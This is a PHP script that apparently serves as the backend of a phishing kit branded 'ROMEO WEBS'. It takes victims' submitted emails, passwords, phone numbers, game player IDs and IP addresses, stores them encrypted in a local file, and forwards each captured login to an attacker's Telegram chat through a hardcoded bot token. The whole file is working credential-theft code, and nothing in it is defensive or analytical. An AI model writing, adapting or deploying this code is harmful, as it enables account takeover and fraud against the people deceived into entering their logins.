<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

define('ENCRYPTION_KEY', 'd0a7e7997b6d5fcd55f4b5c32611b87cd923e88837b63bf2941ef819dc8ca282');
define('ENCRYPTION_METHOD', 'AES-256-CBC');

function encryptData($data) {
    $ivLength = openssl_cipher_iv_length(ENCRYPTION_METHOD);
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encrypted = openssl_encrypt($data, ENCRYPTION_METHOD, ENCRYPTION_KEY, 0, $iv);
    return base64_encode($iv . $encrypted);
}

$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$playid = $_POST['playid'] ?? 'N/A';
$phone = $_POST['phone'] ?? 'N/A';
$level = $_POST['level'] ?? 'N/A';
$login = $_POST['login'] ?? 'N/A';
$ip_address = $_SERVER['REMOTE_ADDR'];
$current_time = date('Y-m-d H:i:s');

$configFile = 'config.json';
if (!file_exists($configFile)) {
    echo json_encode(['status' => 'error', 'message' => 'Config file not found']);
    exit;
}
$fileContent = file_get_contents($configFile);
$config = json_decode($fileContent, true);
if (json_last_error() !== JSON_ERROR_NONE || !is_array($config) || empty($config['chat_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid config.json']);
    exit;
}

$dataId = $config['data_count'] + 1;
$config['data_count'] = $dataId;
file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));

$dataToStore = [
    'id' => $dataId,
    'sender' => $config['name'],
    'email' => $email,
    'password' => $password,
    'playid' => $playid,
    'phone' => $phone,
    'level' => $level,
    'login' => $login,
    'ip_address' => $ip_address,
    'timestamp' => $current_time
];

$storageFile = 'data.json';
$encryptedEntries = [];
if (file_exists($storageFile)) {
    $existingData = json_decode(file_get_contents($storageFile), true);
    if (is_array($existingData)) {
        $encryptedEntries = $existingData;
    }
}
$jsonData = json_encode($dataToStore);
$encryptedData = encryptData($jsonData);
$encryptedEntries[] = $encryptedData;
file_put_contents($storageFile, json_encode($encryptedEntries, JSON_PRETTY_PRINT));

$botToken = '8256686768:AAEjMqWcb8j0hiOL8oqWvdkg';
$defaultChatId = $config['chat_id'];

$message = "╭────── *ROMEO WEBS* #`$dataId` ──────╮\n\n";
$message .= "╰┈➤ *Sender*: `{$config['name']}`\n\n";
$message .= "╰┈➤ 𝗘𝗺𝗮𝗶𝗹/𝗣𝗵𝗼𝗻𝗲 : `$email`\n\n";
$message .= "╰┈➤ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : `$password`\n\n";
$message .= "╰┈➤ 𝗣𝗵𝗼𝗻𝗲 𝗡𝗼 : `$phone`\n\n";
$message .= "╰┈➤ 𝗟𝗲𝘃𝗲𝗹 : `$level`\n\n";
$message .= "╰┈➤ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : `$login`\n\n";
$message .= "╰┈➤ 𝗣𝗹𝗮𝘆𝗲𝗿 𝗜𝗗 : `$playid`\n\n";
$message .= "╰┈➤ 𝗧𝗶𝗺𝗲 : $current_time\n\n";
$message .= "╰┈➤ 𝗜𝗣 : `$ip_address`\n\n";
$message .= "╰┈➤ 𝗪𝗲𝗯 𝗕𝘆 : @ROMEOXWEB";

$imageUrl = "https://i.ibb.co/27r6ZgH9/image.jpg";

function sendToTelegram($chatId, $botToken, $message, $imageUrl) {
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    $postData = [
        'chat_id' => $chatId,
        'photo' => $imageUrl,
        'caption' => $message,
        'parse_mode' => 'Markdown'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    return [$response, $error];
}

list($response1, $error1) = sendToTelegram($defaultChatId, $botToken, $message, $imageUrl);
if ($error1 == "") {
    echo json_encode(['status' => 'success', 'message' => 'Data processed and notification sent']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Telegram notification failed', 'error' => $error1]);
}
?>